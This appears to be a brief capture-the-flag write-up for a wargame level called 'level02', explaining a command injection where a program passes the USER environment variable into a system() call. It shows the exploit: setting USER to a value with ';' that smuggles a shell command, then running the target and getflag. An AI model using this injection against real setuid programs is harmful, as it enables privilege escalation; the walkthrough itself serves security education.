## level02

Vulnerability at line since we can control the buffer that will be executed by the system function with the environment variable $USER</br>

```
asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
```


Can be exploited by changing the env variable USER like:
```
export USER=";/bin/bash/;"
```

Now execute the level
```
./flag02
getflag
```

### flag

```
You have successfully executed getflag on a target account 
```
